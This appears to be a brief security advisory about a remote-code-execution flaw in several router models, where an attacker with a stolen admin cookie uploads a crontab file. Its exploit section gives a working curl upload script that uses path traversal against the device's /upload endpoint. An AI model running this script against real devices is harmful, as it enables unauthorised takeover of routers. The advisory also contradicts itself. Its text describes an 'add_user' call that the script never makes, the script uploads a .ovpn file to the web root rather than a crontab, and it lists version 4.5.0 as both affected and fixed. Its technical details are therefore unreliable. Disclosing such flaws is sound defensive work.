# Remote code execution due to gl_crontabs

## Description

By stealing the AdminToken cookie, an attacker can upload a crontab-formatted file to a specific directory and wait for its execution, thereby executing arbitrary code.

## Affected Product

A1300 /AX1800 /AXT1800 /MT3000 /MT2500 /MT6000 /MT1300 /MT300N-V2 /AR750S /AR750 /AR300M /B1300 

## Affected Firmware Version

4.3.7/4.4.6/4.5.0 Affected, fixed in 4.5.0

## Exploit

Attackers calls the add_user interface within the system module to obtain root privileges.

```
    #!/bin/bash

    echo "sid:"
    read SID

    REMOTE="192.168.8.1"
    UPLOAD_FILE=/tmp/test.ovpn
    DEST_FULLPATH=../../www/test

    curl -v \
    -F sid="$SID" \
    -F path="/tmp/ovpn_upload/$DEST_FULLPATH" \
    -F size=0 \
    -F file=@"$UPLOAD_FILE" \
    "http://$REMOTE/upload"
```

## Impact

Attackers who are able to steal the AdminToken cookie can execute arbitrary code by uploading a crontab-formatted file to a specific directory and waiting for its execution.